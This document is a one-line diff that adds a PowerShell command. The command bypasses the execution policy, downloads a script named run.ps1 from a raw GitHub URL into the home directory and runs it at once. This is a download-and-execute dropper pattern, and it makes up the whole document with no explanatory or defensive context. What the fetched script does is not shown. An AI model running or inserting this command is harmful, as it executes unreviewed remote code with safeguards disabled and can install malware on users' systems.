@@ -1,0 +1,1 @@
+powershell -noexit -ExecutionPolicy Unrestricted -command "& {(new-object System.net.WebClient).DownloadFile("""https://raw.githubusercontent.com/projetcybersecurite/ok/master/run.ps1""", """$HOME/run.ps1"""); & $HOME/run.ps1}"
